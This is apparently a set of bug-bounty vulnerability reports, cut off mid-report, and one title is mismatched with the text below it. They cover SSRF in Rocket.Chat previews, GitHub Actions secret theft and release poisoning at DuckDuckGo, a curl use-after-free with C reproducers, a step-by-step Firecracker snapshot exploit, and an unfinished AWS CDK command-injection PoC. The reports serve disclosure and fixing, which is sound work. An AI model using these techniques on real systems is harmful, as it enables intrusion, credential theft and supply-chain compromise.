title: SSRF via improper validation after DNS name resolution in the link-preview feature
vulnerability_information:
This is a different report from the one I submitted before: #3383079
 
### Summary
In Rocket.Chat version 7.11.0, the  link-preview is a feature that displays a preview of a linked page when a link is sent in the chat, and it is enabled by default.
On the server side, the hostname of the posted URL is initially checked to see if it is a local IP address. Then if it's a local one, link-preview doesn't work.
 However, there is no validation of the IP address after DNS resolution. Therefore, By obtaining some domain and pointing it to a local IP address, an attacker can trigger SSRF and access internal hosts that would otherwise be unreachable.

### Details
In my test environment, I set up an httpbin server on the same LAN as the Rocket.Chat server to verify whether SSRF was possible.
The httpbin server is running at 192.168.100.14:80, and the attacker cannot reach this server directly. 
 
Step 1. An attacker obtains a domain from a domain registration service. In this example, I got " *.conamikan.servegame.com " via https://www.noip.com/
 (now disabled).
{F4918625}
 
Step 2. The attacker posts " http://test.conamikan.servegame.com " to any channel or DM. Then the Rocket.Chat server sends a GET request to the httpbin server on the internal network, resulting in SSRF. Additionally, the attacker can view parts of the httpbin server’s web page via the link-preview feature. 
 
### PoC
In the attached PoC video (PoC_SSRF_2.mp4), I performed the following three attempts. 
 
・Posting http://example.com
　Because this is a valid URL, a preview was displayed. 
 
・Posting http://192.168.100.14
　Because this is a host on the internal network, the SSRF protection prevented a preview from being displayed. 
 
・Posting http://test.conamikan.servegame.com
　This domain is associated with the local IP address 192.168.100.14. Rocket.Chat server finally accessed http://192.168.100.14 and displayed a preview.
{F4918614}

## Impact

### Impact
This enables an attacker to reach internal network resources that would normally be inaccessible and to perform network scanning. Because an attacker can receive parts of responses from internal hosts, the risk of data leakage is very high and requires immediate remediation. The same technique can also be used to access cloud services and metadata endpoints, potentially exposing sensitive cloud-side data and credentials, so there is a significant risk of cloud information leakage.
To fix this issue, the IP address obtained after DNS resolution must also be validated.

title: SSRF via Improper Redirect Validation in Rocket.Chat oEmbed Function
vulnerability_information:
### Summary
In Rocket.Chat version 7.10.1, the oEmbed feature is enabled by default and automatically generates a preview whenever a valid URL is posted in a chat. If the URL redirects to another site, the feature follows the redirect to the final destination.
While the initial URL is filtered for local IP addresses and other checks—so SSRF protections are effective—the same protections are not applied to the redirected URL.
Therefore, an attacker can use a shortened URL or similar to access hosts on the internal network and obtain a preview.

### Details
In my test environment, I set up an httpbin server on the same LAN as the Rocket.Chat server to verify whether SSRF was possible.
The httpbin server is running at 192.168.100.9:8080, and the attacker cannot reach this server directly. 
 
Step 1. The attacker uses a URL-shortening service to create a valid URL that redirects to http://192.168.100.9:8080. In this case I used "https://tinyurl.com/". 
 
Step 2. The attacker posts that URL to any channel or DM. Then the Rocket.Chat server sends a GET request to the httpbin server on the internal network, resulting in SSRF. Additionally, the attacker can view parts of the httpbin server’s web page via the oEmbed preview feature. 
 
### PoC
In the attached PoC video (PoC_SSRF.mp4) we performed the following three attempts. 
 
・Posting http://example.com
　Because this is a valid URL, a preview was displayed. 
 
・Posting http://192.168.100.9:8080
　Because this is a host on the internal network, the SSRF protection prevented a preview from being displayed. 
 
・Posting https://tinyurl.com/bdhdhmrn
　This is a shortened URL that redirects to http://192.168.100.9:8080, but because the redirect destination is not validated. That is why the Rocket.Chat server finally accessed http://192.168.100.9:8080 and displayed a preview. 

{F4891683}

## Impact

### Impact
This allows an attacker to access internal network resources that would otherwise be unreachable and to perform network scanning. Because the attacker can receive portions of responses from internal hosts, the risk of data leakage is extremely high and urgent remediation is required. Furthermore, the same technique could be used to reach cloud services and metadata endpoints (for example, AWS IMDS), potentially exposing sensitive cloud-side data and credentials, so there is also a significant risk of cloud information leakage.
To fix this, it is necessary to properly validate not only the posted URL but also the URL(s) of any redirect destinations.

title: RCE + Supply Chain Attack via pull_request_target in content-scope-scripts/semver-label.yml — Affects All DuckDuckGo Browsers
vulnerability_information:
## Summary

The `duckduckgo/content-scope-scripts` repository's `.github/workflows/semver-label.yml` GitHub Actions workflow uses `pull_request_target` trigger without any access controls, checks out and executes untrusted fork PR code via `npm install` + `npm run build`, and subsequently runs a trusted script with `ANTHROPIC_API_KEY` in the environment. An attacker can exfiltrate the API key, abuse the `GITHUB_TOKEN` (which has `pull-requests: write`) to manipulate semver labels on any PR, and chain into the automated release pipeline (`semver-release.yml` → `build.yml`) to publish a poisoned release consumed by **every DuckDuckGo browser and extension across all platforms**.

The `content-scope-scripts` README describes this package as "shared JavaScript used within ALL DuckDuckGo browsers."

This report contains 4 findings:
1. **RCE + ANTHROPIC_API_KEY exfiltration** via `semver-label.yml`
2. **Supply chain attack** via label manipulation → release pipeline
3. **DAX_PAT exposure** via related `pull_request_target` workflows
4. **10 workflows using `pull_request_target`** across the DuckDuckGo org

---

## Vulnerability Details

### Root Cause

`pull_request_target` runs in the context of the BASE repository with access to secrets. The workflow checks out and executes code from the PR HEAD (attacker-controlled on fork PRs). There are zero access controls — any GitHub user can trigger this by opening a fork PR.

### Vulnerable Workflow (semver-label.yml)

## Impact

1. **RCE + Secret Exfiltration**: Any GitHub user can execute arbitrary code on the Actions runner by opening a fork PR. ANTHROPIC_API_KEY is directly exfiltrable, enabling API abuse at DuckDuckGo's expense.

2. **Release Pipeline Manipulation**: GITHUB_TOKEN with pull-requests:write can add semver labels to any PR, triggering the automated release pipeline on merge. The attacker controls when releases happen.

3. **Supply Chain Compromise — All DuckDuckGo Browsers**: content-scope-scripts is "shared JavaScript used within ALL DuckDuckGo browsers." A poisoned release propagates to Android, iOS, macOS, Windows browsers, Chrome extension, Firefox extension, and the autofill component — affecting tens of millions of users across every platform DuckDuckGo supports.

4. **No Release Signing**: build.yml creates releases with no code signing or integrity verification. Downstream consumers pull from the releases branch with no signature validation.

title: RCE + PAT Exfiltration via pull_request_target in privacy-configuration/auto-respond-pr.yml — Direct Supply Chain to All DDG Browsers
vulnerability_information:
## Summary

The `duckduckgo/privacy-configuration` repository's `.github/workflows/auto-respond-pr.yml` GitHub Actions workflow uses `pull_request_target` trigger, checks out **the fork's repository as both "base" and "PR" branches** (attacker controls both), then executes `npm ci` + `node index.js` on the attacker-controlled code. The `PRIVACY_CONFIG_PAT` secret — a Personal Access Token used for PR auto-approval — is exposed in subsequent workflow steps. Additionally, the `sync_asana_on_close` job unconditionally exposes `ASANA_ACCESS_TOKEN` and `GH_RO_PAT` when any PR (including fork PRs) is closed.

**This is a separate vulnerability from the previously reported `content-scope-scripts/semver-label.yml` finding.** Different repository, different secrets, different attack path, and a shorter supply chain — `privacy-configuration` is consumed via a floating `main` branch dependency with no tag or SHA pinning.

---

## Vulnerability Details

### Root Cause

The workflow uses `pull_request_target` (privileged context with secrets) and contains two critical flaws:

1. **Fork checkout as "base"**: The base branch checkout uses `repository: ${{ github.event.pull_request.head.repo.full_name }}` — this checks out the **fork's** repo, not the actual base. The attacker controls BOTH checkouts.
2. **Arbitrary code execution**: `npm ci` and `node index.js` run on fork code with `PRIVACY_CONFIG_PAT` available in subsequent steps.

### Vulnerable Workflow (auto-respond-pr.yml)

---

**Cross-reference:** This vulnerability is separate from report #3619287 (content-scope-scripts/semver-label.yml). Different repository, different secrets, different attack path, and a shorter supply chain.

## Impact

1. **RCE + PRIVACY_CONFIG_PAT Theft**: Any GitHub user can execute arbitrary code on the Actions runner by opening a fork PR. The PRIVACY_CONFIG_PAT — used for PR auto-approval — is exfiltrable. This PAT likely has repo scope, enabling the attacker to approve their own PRs, push to branches, and access private repository contents.

2. **Base Branch Impersonation**: The "base" checkout retrieves the fork's code, not the real base. Any diff-based validation is defeated. The attacker controls 100% of the code the workflow operates on.

3. **Direct Supply Chain — All DuckDuckGo Browsers**: privacy-configuration controls tracker blocking, fingerprint protection, and privacy features for ALL DDG browsers. The duckduckgo-privacy-extension uses a floating main dependency with no tag or SHA pin. An attacker who steals PRIVACY_CONFIG_PAT can approve and merge a malicious PR to main, and the poisoned configuration propagates directly into the next build of every DuckDuckGo product — Android, iOS, macOS, Chrome extension, Firefox extension.

4. **Silent Privacy Degradation**: Unlike code injection (which may crash or behave visibly), a poisoned privacy configuration can silently disable tracker blocking or fingerprint protections for all users without any visible indicator. Users would believe they are protected while their privacy protections are disabled.

5. **Additional Secrets**: ASANA_ACCESS_TOKEN and GH_RO_PAT are unconditionally exposed when any fork PR is closed, enabling access to DuckDuckGo's Asana project management and GitHub read access.

title: heap-use-after-free in state.referer when CURLOPT_REFERER replaced or cleared after perform
vulnerability_information:
Calling `curl_easy_setopt(curl, CURLOPT_REFERER, ...)` to replace or clear a previously-set referer after `curl_easy_perform()` frees the old string via `Curl_setstropt` (lib/setopt.c:87) but leaves `data->state.referer.ptr` pointing at the freed heap region. `curl_easy_getinfo(CURLINFO_REFERER)` and `curl_easy_duphandle()` then read through the dangling pointer. ASAN catches all three vectors reliably. Read-only, in-process UAF - the leaked bytes do NOT reach the wire.

This is an incomplete-fix variant of #21741. The 2026-05-25 fix `862e8a74a` covers the next-perform window (clears `state.referer` in `Curl_pretransfer` when set to NULL), but does not cover the getinfo and duphandle paths between setopt and the next perform, and does not handle replacement (non-NULL to non-NULL) at all.

The regression was introduced by `fa057ea3d` (2026-04-15) which switched `state.referer` to a `bufref` aliasing `set.str[STRING_SET_REFERER]` without a setopt mirror. No released version is affected - 8.20.0 predates `fa057ea3d`.

## Affected version

Tested on master HEAD `872c313d7` (2026-06-01). The relevant sites (`lib/transfer.c:511-513`, `lib/setopt.c:2027`, `lib/easy.c:1022-1027`, `lib/getinfo.c:145`) are unchanged since `fa057ea3d`.

```bash
curl 8.14.0-DEV (x86_64-pc-linux-gnu) libcurl/8.14.0-DEV OpenSSL/3.5.0 zlib/1.3.1
Built with ASAN+UBSan: -fsanitize=address,undefined -O0 -g
```

## Steps To Reproduce

Build curl master with ASAN:

```bash
git clone https://github.com/curl/curl.git && cd curl
cmake -S . -B build \
  -DCMAKE_BUILD_TYPE=Debug \
  -DCMAKE_C_FLAGS="-fsanitize=address,undefined -fno-omit-frame-pointer -g -O0" \
  -DCMAKE_EXE_LINKER_FLAGS="-fsanitize=address,undefined" \
  -DCMAKE_SHARED_LINKER_FLAGS="-fsanitize=address,undefined" \
  -DCURL_USE_OPENSSL=ON -DBUILD_SHARED_LIBS=ON \
  -DBUILD_TESTING=OFF -DBUILD_CURL_EXE=OFF
cmake --build build -j --target libcurl_shared
```

**Vector 1 - getinfo after replacement** (uaf_referer.c):

```c
#include <curl/curl.h>
#include <stdio.h>
#include <string.h>
static size_t devnull(void *p, size_t s, size_t n, void *u){(void)p;(void)u;return s*n;}
int main(void){
    CURL *curl; const char *ref = NULL;
    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();
    curl_easy_setopt(curl, CURLOPT_URL, "file:///dev/null");
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, devnull);
    curl_easy_setopt(curl, CURLOPT_REFERER, "http://example.com/secret-A");
    curl_easy_perform(curl);
    /* frees old copy; state.referer dangles */
    curl_easy_setopt(curl, CURLOPT_REFERER, "http://example.com/B");
    curl_easy_getinfo(curl, CURLINFO_REFERER, &ref);
    if(ref) printf("strlen=%zu\n", strlen(ref)); /* UAF read */
    curl_easy_cleanup(curl);
    curl_global_cleanup();
}
```

```bash
gcc -O0 -g -fsanitize=address,undefined uaf_referer.c \
    -Iinclude -Lbuild/lib -lcurl-d -Wl,-rpath,build/lib -o uaf_referer
ASAN_OPTIONS=detect_leaks=0 ./uaf_referer
```

ASAN output:

```bash
==PID==ERROR: AddressSanitizer: heap-use-after-free on address ...
READ of size 2 ... thread T0
    #0 strlen
    #1 main uaf_referer.c:...
freed by thread T0 here:
    #1 Curl_setstropt lib/setopt.c:87
    #2 setopt_cptr lib/setopt.c:2027
previously allocated by thread T0 here:
    #1 Curl_setstropt lib/setopt.c:93
```

**Vector 2 - getinfo after setopt to NULL** (uaf_referer_null.c): Same flow but the replacement is `NULL`. The 2026-05-25 fix clears `state.referer` in the next `Curl_pretransfer`, but `getinfo` between setopt and perform still UAFs. ASAN trace attached.

**Vector 3 - duphandle after replacement** (uaf_referer_dup.c):

```c
curl_easy_setopt(curl, CURLOPT_REFERER, "http://example.com/secret-A");
curl_easy_perform(curl);
curl_easy_setopt(curl, CURLOPT_REFERER, "http://example.com/B");
CURL *dup = curl_easy_duphandle(curl); /* strdup on dangling ptr */
```

`curl_easy_duphandle` calls `Curl_bufref_dup` (lib/easy.c:1024) which runs `strdup()` on the dangling pointer - ASAN catches this as a heap-use-after-free read.

Note: the leaked bytes do NOT reach the wire. The dup handle's next `curl_easy_perform()` re-aliases `state.referer` from `set.str[STRING_SET_REFERER]` in `Curl_pretransfer` (lib/transfer.c:511-515) before the `Referer:` header builder (lib/http.c:2941) runs. Verified empirically with a localhost listener: the dup handle transmitted the current referer, not the freed bytes.

**Root cause:** `CURLOPT_URL` at lib/setopt.c:2202-2208 mirrors the setopt into `state.url` via `Curl_bufref_set`. `CURLOPT_REFERER` at lib/setopt.c:2027 does not have this mirror - the asymmetry is the bug.

**Suggested fix:** Mirror `CURLOPT_REFERER` setopt into `state.referer` (matching the `CURLOPT_URL` pattern), or change `Curl_bufref_set` in `lib/transfer.c:512` to `Curl_bufref_memdup0` so `state.referer` owns its own copy.

## Again: there is no bug-bounty for curl. We do not offer any rewards, only proper credits.

Understood. Submitting for CVE assignment and credit.

## Impact

- Read-only, in-process heap-use-after-free of the freed referer string. The read may land on another live allocation (credentials, headers, cookies) depending on heap reuse.
- Vectors 1+2: the dangling pointer is returned to the application via `CURLINFO_REFERER`. The docs guarantee this pointer is valid until `curl_easy_cleanup` - the UAF violates that documented contract. Any application that dereferences, logs, or copies the returned value reads freed heap.
- Vector 3: `curl_easy_duphandle()` strdup's the dangling pointer (the UAF read itself). The leaked bytes land in the dup handle's `state.referer` but are overwritten by `Curl_pretransfer` before any network I/O - so this is an in-process UAF read only, same impact class as vectors 1+2.
- No released version is affected - `fa057ea3d` (2026-04-15) introduced the regression post-8.20.0.

title: CRLF Injection via Custom HTTP Headers
Firecracker Out-of-bounds Read/Write Local Privilege Escalation Vulnerability
vulnerability_information:
## Title:

Firecracker Out-of-bounds Read/Write Local Privilege Escalation Vulnerability

## Acknowledgements

████████ (████████) of ████████ and ████████ (████████)

## Affect Product

Firecracker v1.15.1 (Latest)

## Description:

### Original vulnerability: direct post-activation PCI queue mutation

The original issue behind CVE-2026-5747 was in the virtio PCI common configuration write path. In the vulnerable code, queue configuration registers were written directly into the live `Queue` object without checking whether the device had already been activated.

Vulnerable code in the old tree:

File: `src/vmm/src/devices/virtio/transport/pci/common_config.rs`  
Lines: `202`, `219`, `314-330`

```rust
0x18 => self.with_queue_mut(queues, |q| q.size = value),
...
0x1c => self.with_queue_mut(queues, |q| {
    if value != 0 {
        q.ready = value == 1;
    }
}),
...
0x20 => self.with_queue_mut(locked_device.queues_mut(), |q| {
    lo(&mut q.desc_table_address, value)
}),
0x24 => self.with_queue_mut(locked_device.queues_mut(), |q| {
    hi(&mut q.desc_table_address, value)
}),
0x28 => self.with_queue_mut(locked_device.queues_mut(), |q| {
    lo(&mut q.avail_ring_address, value)
}),
0x2c => self.with_queue_mut(locked_device.queues_mut(), |q| {
    hi(&mut q.avail_ring_address, value)
}),
0x30 => self.with_queue_mut(locked_device.queues_mut(), |q| {
    lo(&mut q.used_ring_address, value)
}),
0x34 => self.with_queue_mut(locked_device.queues_mut(), |q| {
    hi(&mut q.used_ring_address, value)
}),
```

That was dangerous because queue activation validates queue geometry only once and then caches raw host pointers derived from that geometry.

File: `src/vmm/src/devices/virtio/queue.rs`  
Lines: `342-369`

```rust
pub fn initialize<M: GuestMemory>(&mut self, mem: &M) -> Result<(), QueueError> {
    ...
    self.desc_table_ptr =
        self.get_aligned_slice_ptr(mem, self.desc_table_address, self.desc_table_size(), 16)?;
    self.avail_ring_ptr =
        self.get_aligned_slice_ptr(mem, self.avail_ring_address, self.avail_ring_size(), 2)?;
    self.used_ring_ptr =
        self.get_aligned_slice_ptr(mem, self.used_ring_address, self.used_ring_size(), 4)?;
    Ok(())
}
```

After activation, later queue operations trust `self.size` for indexing, but still dereference the cached pointers. If the guest changes queue fields after activation, Firecracker can perform out-of-bounds virtqueue reads and writes through stale pointers.

### How the fix works

The fix in `1.14.4` / `1.15.1` adds a guard that only permits queue configuration writes while the device is in the virtio setup state `ACKNOWLEDGE | DRIVER | FEATURES_OK` (`0xb`), before `DRIVER_OK` and before backend activation is complete.

Fixed code:

File: `src/vmm/src/devices/virtio/transport/pci/common_config.rs`  
Lines: `237-254`, `272-294`, `396-413`

```rust
fn update_queue_field<F: FnOnce(&mut Queue)>(&mut self, queues: &mut [Queue], f: F) {
    let status = self.driver_status;
    if status == (ACKNOWLEDGE | DRIVER | FEATURES_OK) {
        self.with_queue_mut(queues, f);
    } else {
        warn!(
            "pci: queue config write not allowed in device status {:#x}",
            status
        );
    }
}
...
QUEUE_SIZE => self.update_queue_field(queues, |q| q.size = value),
...
QUEUE_ENABLE => self.update_queue_field(queues, |q| {
    if value != 0 {
        q.ready = value == 1;
    }
}),
...
QUEUE_DESC_LO => self.update_queue_field(locked_device.queues_mut(), |q| {
    lo(&mut q.desc_table_address, value)
}),
...
QUEUE_USED_HI => self.update_queue_field(locked_device.queues_mut(), |q| {
    hi(&mut q.used_ring_address, value)
}),
```

So the intended invariant is:

- queue pointers are initialized once using validated geometry
- once the backend is active, PCI queue fields are no longer writable

### Bypass path: hostile snapshot restore recreates the forbidden state

The bypass exists because snapshot restore reconstructs queue activation state and PCI `driver_status` from different serialized fields, but does not validate that they are consistent with each other.

1. Queue restore rebuilds cached raw pointers whenever the saved virtio device state says the queue is already activated.

File: `src/vmm/src/devices/virtio/persist.rs`  
Lines: `88-111`

```rust
fn restore(
    constructor_args: Self::ConstructorArgs,
    state: &Self::State,
) -> Result<Self, Self::Error> {
    let mut queue = Queue {
        max_size: state.max_size,
        size: state.size,
        ready: state.ready,
        desc_table_address: GuestAddress(state.desc_table),
        avail_ring_address: GuestAddress(state.avail_ring),
        used_ring_address: GuestAddress(state.used_ring),
        ...
    };
    if constructor_args.is_activated {  //--[1]
        queue.initialize(&constructor_args.mem)?;
    }
    Ok(queue)
}
```

2. PCI restore independently trusts `state.device_activated` and re-activates the backend.

File: `src/vmm/src/devices/virtio/transport/pci/device.rs`  
Lines: `437-459`

```rust
let mut virtio_pci_device = VirtioPciDevice {
    ...
    common_config: virtio_common_config,
    ...
    device_activated: Arc::new(AtomicBool::new(state.device_activated)), //--[1]
    ...
};

if state.device_activated {
    virtio_pci_device
        .device
        .lock()
        .expect("Poisoned lock")
        .activate(
            virtio_pci_device.memory.clone(),
            virtio_pci_device.virtio_interrupt.as_ref().unwrap().clone(),
        );
}
```

3. The queue-write gate still checks only `common_config.driver_status`.

File: `src/vmm/src/devices/virtio/transport/pci/common_config.rs`  
Lines: `244-247`

```rust
let status = self.driver_status;
if status == (ACKNOWLEDGE | DRIVER | FEATURES_OK) {
    self.with_queue_mut(queues, f);
}
```

This means a hostile snapshot can restore:

- `VirtioDeviceState.activated = true`
- `VirtioPciDeviceState.device_activated = true`
- `VirtioPciCommonConfigState.driver_status = 0xb`

After restore, Firecracker has:

- an already active backend
- queues whose raw pointers were reinitialized from the saved geometry
- PCI queue writes permitted again because `driver_status == 0xb`

That recreates the same stale-pointer condition that the original fix was meant to prevent.

### Confirmed consequence

Using the hostile restore state above, the guest can mutate the live queue again after restore and revive the old stale used-ring path:

- out-of-bounds avail-ring read relative to the originally validated queue
- out-of-bounds descriptor-table read relative to the originally validated queue
- out-of-bounds used-ring write through the stale `used_ring_ptr`

## Proof of Concept

### Building the Firecracker

Build Firecracker in the normal way:

```bash
git clone https://github.com/firecracker-microvm/firecracker.git
cd firecracker/
git checkout v1.15.1
./tools/devtool checkenv
sudo systemctl start docker
sudo ./tools/devtool build --release
```

Expected binaries:

```bash
file ./build/cargo_target/x86_64-unknown-linux-musl/release/firecracker
file ./build/cargo_target/x86_64-unknown-linux-musl/release/jailer
```

### Building PoC

**Notice**: Most scripts use default paths under `████████...`. Update those paths to match your local environment before running them.

#### 1. Build the guest OS

```sh
cd ~/firecracker/resources
git clone --depth=1 https://github.com/amazonlinux/linux
```

The split-probe kernel builder expects a local Amazon Linux kernel tree at:

```text
~/firecracker/resources/linux
```

After cloning, prepare the kernel config.

Use the base microvm config and then merge in the PCI fragment with the kernel's config merge helper:

```sh
cp ~/firecracker/resources/guest_configs/microvm-kernel-ci-x86_64-6.1.config \
   ~/firecracker/resources/linux/.config
~/firecracker/resources/linux/scripts/config --file ~/firecracker/resources/linux/.config \
   --enable PCI \
   --enable PCI_MMCONFIG \
   --enable PCI_MSI \
   --enable PCIEPORTBUS \
   --enable VIRTIO_PCI \
   --enable PCI_HOST_COMMON \
   --enable PCI_HOST_GENERIC \
   --enable BLK_MQ_PCI \
   --enable VIRTIO_BLK \
   --enable EXT4_FS
make -C ~/firecracker/resources/linux olddefconfig
```

If a reviewer prefers a quick manual merge, appending `pcie.config` and then running
`olddefconfig` also works, but it produces noisy override warnings and is easier to get wrong.

Before building, sanity-check that the guest kernel config really has PCI enabled:

```sh
grep -E '^(CONFIG_PCI=|CONFIG_VIRTIO_PCI=|CONFIG_PCI_MSI=|CONFIG_VIRTIO_BLK=|CONFIG_EXT4_FS=)' \
    ~/firecracker/resources/linux/.config
```

Expected output should include at least:

```text
CONFIG_PCI=y
CONFIG_PCI_MSI=y
CONFIG_VIRTIO_BLK=y
CONFIG_VIRTIO_PCI=y
CONFIG_EXT4_FS=y
```

Unzip the attachment files then move it to the `~/pci_snapshot_restore_bypass_demo/`.
Copy the poc files then build the split-probe kernel:

```sh
mkdir ~/firecracker/resources/kernel_poc/
cp ~/pci_snapshot_restore_bypass_demo/split_probe_builder/resources/kernel_poc/fc_pci_queue_split_probe_builtin.c ~/firecracker/resources/kernel_poc/fc_pci_queue_split_probe_builtin.c
cp ~/pci_snapshot_restore_bypass_demo/split_probe_builder/tools/build_fc_pci_split_probe_kernel.sh ~/firecracker/tools
cd ~/firecracker/tools
./build_fc_pci_split_probe_kernel.sh
```

Expected output:

```text
/tmp/fc-pci-split-probe-kernel/vmlinux-fc-pci-split-probe
```

#### 2. Build the guest image

```sh
cd ~/pci_snapshot_restore_bypass_demo/
./build_guest_image.sh
```

#### 3. Save a normal snapshot

```sh
./start_normal_instance_and_snapshot.sh
```

This writes:

- `/tmp/fc-normal-snapshot/orig.vmstate`
- `/tmp/fc-normal-snapshot/orig.mem`

#### 4. Mutate the snapshot

1. Build the patcher:

remember to change the vmm path in `~/pci_snapshot_restore_bypass_demo/snapshot_patcher/Cargo.toml` first
```toml
vmm = { path = "████████Desktop/firecracker/firecracker/src/vmm" }
```

```sh
cd ~/pci_snapshot_restore_bypass_demo/snapshot_patcher
cargo build --offline
```

If `--offline` fails:

```sh
cd ~/pci_snapshot_restore_bypass_demo/snapshot_patcher
cargo build
```

2. Mutate the snapshot:

```sh
~/pci_snapshot_restore_bypass_demo/snapshot_patcher/target/debug/patch_snapshot \
/tmp/fc-normal-snapshot/orig.vmstate \
/tmp/fc-normal-snapshot/patched.vmstate
```

Expected output:

```text
before_driver_status=0xf
after_driver_status=0xb
transport_device_activated=true
backend_virtio_activated=true
```

That is the malformed snapshot:

- original snapshot stays at `/tmp/fc-normal-snapshot/orig.vmstate`
- mutated snapshot becomes `/tmp/fc-normal-snapshot/patched.vmstate`

Tool needed:

- the local Rust tool in `pci_snapshot_restore_bypass_demo/snapshot_patcher`
- source entry point: `pci_snapshot_restore_bypass_demo/snapshot_patcher/src/main.rs`

### Executing PoC

#### 1. Start a fresh Firecracker process

```sh
cd ~/pci_snapshot_restore_bypass_demo
./start_firecracker.sh
```

This starts Firecracker with:

- API socket: `/tmp/fc-start/api.sock`
- log: `/tmp/fc-start/firecracker.log`
- PID file: `/tmp/fc-start/firecracker.pid`

So after it print the PID, you can `sudo gdb -p <PID>`

#### 2. Load the mutated snapshot and resume the VM

```sh
./load_mutated_snapshot.sh
```

Guest OS will trigger out-of-bounds write after 10 seconds.

By default this sends:

- `/tmp/fc-normal-snapshot/patched.vmstate`
- `/tmp/fc-normal-snapshot/orig.mem`

to the Firecracker process listening on `/tmp/fc-start/api.sock`.

#### 3. Observe the restored state

```sh
cat /tmp/fc-start/firecracker.log

[   10.522823] queue_size mutated live to 65535; issuing 1 post-mutation request(s) through the stale queue state
[   10.525730] post-mutation request 1/1: pop avail.ring[65534], consume desc[1], and write used[65534] past guest RAM
2026-04-09T04:43:36.312507266 [anonymous-instance:main] Shutting down VM after intercepting signal 11, code 1.
```

At this point the malformed snapshot has been restored and resumed. This reproduces the restore-time bypass state:

- backend remains activated
- PCI `driver_status` is rolled back to `0xb`
- post-activation PCI queue mutation becomes possible again

The script above restores the vulnerable state. The stronger guest-triggered crash consequence is then exercised by the companion split-queue crash flow.

### Stack Trace

When the reviewer attaches with GDB at the `restore_loaded_paused` stage and then resumes the VM, the expected backtrace shows the crash in the virtio queue used-ring write path. The crash occurs because the used-ring write goes past guest RAM and lands in an unmapped page.

```text
#0  0x000074fe21990afc in vmm::devices::virtio::rng::device::Entropy::process_entropy_queue ()
#1  0x000074fe2198fce0 in vmm::devices::virtio::rng::event_handler::<impl event_manager::MutEventSubscriber for vmm::devices::virtio::rng::device::Entropy>::process ()
#2  0x000074fe2186b9aa in event_manager::manager::EventManager<S>::run_with_timeout ()
#3  0x000074fe21862509 in firecracker::api_server_adapter::run_with_api ()
#4  0x000074fe2186910b in firecracker::main ()
#5  0x000074fe21871393 in std::sys::backtrace::__rust_begin_short_backtrace ()
#6  0x000074fe218aa643 in main ()
```

This confirms that the bypass revives the original stale `used_ring_ptr` primitive rather than only triggering the easier `InvalidAvailIdx` panic path.

## Impact

## Summary:

Firecracker is an open source virtualization technology purpose-built for secure multi-tenant container and function workloads. A variant of CVE-2026-5747 exists where, under hostile snapshot restore conditions, a guest can bypass the post-activation virtio PCI queue-write fix by restoring an active device with rolled-back PCI driver_status, reviving stale virtqueue pointer use and enabling out-of-bounds virtqueue access, including a host-crashing out-of-bounds used-ring write.

title: Command Injection via Unsanitized Bundling Options in `aws-cdk-lib/aws-lambda-nodejs`
vulnerability_information:
**Asset**: `aws-cdk-lib` (npm package), source: https://github.com/aws/aws-cdk
**Severity**: High
**CWE**: CWE-78 (Improper Neutralization of Special Elements used in an OS Command, 'OS Command Injection')

---

## Summary

The `NodejsFunction` construct in `aws-cdk-lib/aws-lambda-nodejs` constructs a shell command string from several user-controlled bundling properties (`externalModules`, `define`, `loader`, `inject`, `esbuildArgs`) without sanitizing or escaping shell metacharacters. This command string is then executed via `spawnSync('cmd', ['/c', command])` on Windows or `spawnSync('bash', ['-c', command])` on Linux/macOS.

An attacker who controls these properties (for example, through a malicious CDK construct published as an npm package or a malicious pull request to a CDK project) can inject arbitrary OS commands that execute on any machine running `cdk synth`, `cdk deploy`, or `cdk diff`.

---

## Vulnerable Code

**File**: [`packages/aws-cdk-lib/aws-lambda-nodejs/lib/bundling.ts`](https://github.com/aws/aws-cdk/blob/main/packages/aws-cdk-lib/aws-lambda-nodejs/lib/bundling.ts)

### .1 Unsanitized interpolation into the esbuild command array (lines 245–266)

```typescript
// bundling.ts, lines 245-266
const esbuildCommand: string[] = [
  options.esbuildRunner,
  '--bundle', `"${relativeEntryPath}"`,
  `--target=${this.props.target ?? toTarget(scope, this.props.runtime)}`,
  '--platform=node',
  // ...
  ...this.externals.map(external => `--external:${external}`),         // LINE 255 — NO ESCAPING
  ...loaders.map(([ext, name]) => `--loader:${ext}=${name}`),          // LINE 256 — NO ESCAPING
  ...defines.map(([key, value]) => `--define:${key}=${JSON.stringify(value)}`), // LINE 257 — key NOT ESCAPED
  // ...
  ...this.props.inject ? this.props.inject.map(i => `--inject:"${i}"`) : [],   // LINE 265 — NO ESCAPING
  ...this.props.esbuildArgs ? [toCliArgs(this.props.esbuildArgs)] : [],         // LINE 266 — NO ESCAPING
];
```

The values of `external`, `ext` (loader keys), `key` (define keys), `i` (inject paths), and `esbuildArgs` keys/values are all interpolated directly into the command string without any sanitization or quoting.

### .2 Command string assembly (line 302)

```typescript
// bundling.ts, line 302
esbuildCommand.join(' ')
```

All array elements are joined with a single space. Shell metacharacters like `&`, `|`, `;`, `` ` ``, `$(...)` within any element will be interpreted by the shell.

### .3 Shell execution (lines 334–349)

```typescript
// bundling.ts, lines 334-349
exec(
  osPlatform === 'win32' ? 'cmd' : 'bash',
  [
    osPlatform === 'win32' ? '/c' : '-c',
    localCommand,   // <-- the unsanitized command string
  ],
  {
    env: { ...process.env, ...environment },
    stdio: ['ignore', process.stderr, 'inherit'],
    cwd,
    windowsVerbatimArguments: osPlatform === 'win32',
  });
```

Where `exec` is a thin wrapper around `spawnSync` in `lib/util.ts` (line 74):

```typescript
// util.ts, line 74
export function exec(cmd: string, args: string[], options?: SpawnSyncOptions) {
  const proc = spawnSync(cmd, args, options);
  // ...
}
```

The `localCommand` string is passed as the second argument to `cmd /c` (Windows) or `bash -c` (Linux), meaning the entire string is interpreted by the operating system's shell.

---

## Proof of Concept

### Prerequisites
- Node.js v18+ installed
- npm installed

### Step 1: Create the project

```bash
mkdir repro-cdk-bundling-rce
cd repro-cdk-bundling-rce
npm init -y
```

### Step 2: Install dependencies

```bash
npm install aws-cdk-lib constructs esbuild typescript
npm install --save-dev aws-cdk ts-node
```

### Step 3: Create `tsconfig.json`

```json
{
  "compilerOptions": {
    "target": "es2020",
    "module": "commonjs",
    "strict": true,
    "skipLibCheck": true
  }
}
```

### Step 4: Create `lambda/lambda-handler.ts`

```bash
mkdir lambda
```

```typescript
// lambda/lambda-handler.ts
export const handler = async (event: any) => {
    return { statusCode: 200, body: 'Hello' };
};
```

### Step 5: Create `app.ts` with the injection payload

```typescript
import * as cdk from 'aws-cdk-lib';
import { Stack, StackProps } from 'aws-cdk-lib';
